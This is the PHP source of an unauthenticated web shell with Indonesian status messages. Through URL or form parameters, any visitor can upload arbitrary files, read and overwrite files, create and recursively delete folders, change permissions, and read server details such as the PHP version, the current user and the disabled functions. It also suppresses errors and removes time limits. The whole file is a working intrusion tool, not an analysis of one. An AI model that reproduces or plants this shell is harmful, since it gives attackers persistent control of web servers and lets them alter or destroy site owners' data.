<?php
error_reporting(0);
set_time_limit(0);

function rrmdir($dir) {
    if (!is_dir($dir)) return;
    $files = array_diff(scandir($dir), ['.', '..']);
    foreach ($files as $file) {
        $path = "$dir/$file";
        is_dir($path) ? rrmdir($path) : unlink($path);
    }
    rmdir($dir);
}

function safePath($path) {
    // Jangan izinkan path di luar shell ini (bisa diubah sesuai kebutuhan)
    $base = realpath(__DIR__);
    $real = realpath($path);
    return $real !== false && str_starts_with($real, $base);
}

$cwd = getcwd();
$action = $_REQUEST['action'] ?? '';
$target = $_REQUEST['target'] ?? '';
$content = $_REQUEST['content'] ?? '';
$mode = $_REQUEST['mode'] ?? '';

if (!empty($target)) {
    $target = str_replace(['..', "\0"], '', $target); // prevent path traversal
    $targetPath = realpath($target) ?: $cwd . DIRECTORY_SEPARATOR . $target;
    if (!safePath($targetPath)) {
        die("Access denied.");
    }
} else {
    $targetPath = $cwd;
}

echo "<pre style='font-family: monospace;'>";

switch ($action) {
    case 'upload':
        if (!empty($_FILES['file'])) {
            $uploadDir = $targetPath;
            if (!is_dir($uploadDir)) {
                echo "Folder tidak ditemukan.\n";
                break;
            }
            $file = $_FILES['file'];
            $dest = $uploadDir . DIRECTORY_SEPARATOR . basename($file['name']);
            if (move_uploaded_file($file['tmp_name'], $dest)) {
                echo "Upload berhasil: $dest\n";
            } else {
                echo "Upload gagal.\n";
            }
        } else {
            echo "Tidak ada file yang diupload.\n";
        }
        break;

    case 'edit':
        if (!is_file($targetPath)) {
            echo "File tidak ditemukan.\n";
            break;
        }
        if ($content !== '') {
            if (file_put_contents($targetPath, $content) !== false) {
                echo "File berhasil diedit.\n";
            } else {
                echo "Gagal menulis file.\n";
            }
        } else {
            echo htmlspecialchars(file_get_contents($targetPath));
        }
        break;

    case 'mkdir':
        if ($target !== '') {
            if (mkdir($targetPath, 0755, true)) {
                echo "Folder berhasil dibuat: $target\n";
            } else {
                echo "Gagal membuat folder.\n";
            }
        } else {
            echo "Nama folder tidak boleh kosong.\n";
        }
        break;

    case 'rmfile':
        if (is_file($targetPath)) {
            if (unlink($targetPath)) {
                echo "File berhasil dihapus: $target\n";
            } else {
                echo "Gagal menghapus file.\n";
            }
        } else {
            echo "File tidak ditemukan.\n";
        }
        break;

    case 'rmdir':
        if (is_dir($targetPath)) {
            rrmdir($targetPath);
            echo "Folder beserta isinya berhasil dihapus: $target\n";
        } else {
            echo "Folder tidak ditemukan.\n";
        }
        break;

    case 'chmod':
        if ($target !== '') {
            $modeDec = intval($mode, 8);
            if (chmod($targetPath, $modeDec)) {
                echo "Permission berhasil diubah ke $mode untuk $target\n";
            } else {
                echo "Gagal mengubah permission.\n";
            }
        } else {
            echo "Target dan mode harus diisi.\n";
        }
        break;

    case 'info':
        echo "Server Software: " . $_SERVER['SERVER_SOFTWARE'] . "\n";
        echo "PHP Version: " . phpversion() . "\n";
        echo "User: " . get_current_user() . "\n";
        echo "Current Directory: " . $cwd . "\n";
        echo "Disable Functions: " . ini_get('disable_functions') . "\n";
        break;

    case 'pwd':
        echo "Current working directory: " . $cwd . "\n";
        break;

    default:
        echo "Shell aktif. Gunakan parameter ?action= dan sesuaikan:\n";
        echo "- upload (pakai form file: file)\n";
        echo "- edit (target=file, content=text)\n";
        echo "- mkdir (target=foldername)\n";
        echo "- rmfile (target=file)\n";
        echo "- rmdir (target=foldername)\n";
        echo "- chmod (target=path, mode=octal seperti 755)\n";
        echo "- info\n";
        echo "- pwd\n\n";

        // Form upload sederhana
        echo "<form method='POST' enctype='multipart/form-data'>";
        echo "<input type='hidden' name='action' value='upload'>";
        echo "Upload file ke folder (target): <input type='text' name='target' value='" . htmlspecialchars($cwd) . "'><br>";
        echo "<input type='file' name='file'><br>";
        echo "<input type='submit' value='Upload'>";
        echo "</form>";
        break;
}

echo "</pre>";
?>
